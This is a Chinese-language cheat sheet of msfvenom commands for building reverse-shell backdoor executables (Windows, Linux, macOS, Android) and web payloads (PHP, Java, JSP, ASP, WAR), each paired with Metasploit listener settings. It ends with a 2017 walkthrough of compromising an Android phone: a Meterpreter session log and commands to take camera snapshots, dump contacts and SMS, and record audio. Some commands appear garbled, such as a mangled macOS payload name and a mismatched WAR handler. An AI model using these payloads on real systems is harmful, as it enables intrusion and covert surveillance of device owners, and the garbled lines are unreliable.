# 可执行脚本反弹shell

## 1.windows下exe执行文件后门  

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x >文件路径/文件名



案例：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x >/shell.exe
```

### 监听设置:

```
msfconsole



use exploit/multi/handler



set payload windows/meterpreter/reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444
exploit
```

## 2.linux下执行文件后门

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x >文件路径/文件名



案例：msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 x >/linux_shell



需要给执行权限 chmod +x linux_shell
```

### 监听设置

```
msfconsole
use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.43.193
set LPORT 4444
exploit
```

## 3.mac后门

```
msfvenom -p osx/x86ell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f macho > 文件路径/文件名
案例：msfvenom -p osx/x86ell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f macho > shell.macho
```

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload osx/x86/shell_reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

## 4.android后门

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 R > 文件路径/文件名



案例：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 R > shell.apk
```

手机安装apk文件点击执行

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload android/meterpreter/reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

# webpayload

### PHP后门

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x>文件路径/文件名



案例：msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x> shell.php
```

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload php/meterpreter/reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

## 2.java后门

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x >文件路径/文件名



案例：msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x >shell.jar
```

运行命令：java -jar shell.jar

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload java/meterpreter/reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

## 3.jsp后门

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f raw >文件路径/文件名



案例：msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f raw > shell.jsp
```

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload java/jsp_shell_reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

## 4.asp后门

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f asp > 文件路径/文件名



案例：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f asp > shell.asp
```

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload windows/meterpreter/reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

## 5.war后门

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f war > shell.war



Scripting Payloads



案例：msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f war > shell.war



Scripting Payloads
```

### 监听设置

```
msfconsole



use exploit/multi/handler



set payload windows/meterpreter/reverse_tcp



set LHOST 192.168.43.193



set LPORT 4444



exploit
```

# MSF初体验—入侵安卓手机

Jimny 2017-06-27 [原文](https://www.shuzhiduo.com/link/Vkd6bEVNUjhKYg==)

1.生成apk程序

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 R > apk.apk

2.启动msfconsole

3.启动use exploit/multi/handler模块

4.set payload android/meterpreter/reverse_tcp

5.show options

6.准备工作

msf exploit(handler) > set LHOST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(handler) > set LPORT 5555
LPORT => 5555
msf exploit(handler) > exploit（运行apk程序）

[*] Started reverse TCP handler on 192.168.1.101:5555
[*] Starting the payload handler...
[*] Sending stage (63194 bytes) to 192.168.1.105
[*] Meterpreter session 1 opened (192.168.1.101:5555 -> 192.168.1.105:57629) at 2017-06-27 22:25:09 +0800

7.查看手机信息sysinfo

8.查看摄像头

meterpreter > webcam_list
1: Back Camera
2: Front Camera

9.启动摄像头拍照

webcam_snap -i 1

webcam_snap -i 2

dump_contacts  --》这个是导出电话

dump_sms         --》这个是导出信息

record_mic   Record audio from the default microphone for X seconds

webcam_chat  Start a video chat

webcam_list  List webcams

webcam_snap  Take a snapshot from the specified webcam

webcam_stream Play a video stream from the specified webcam

成功解决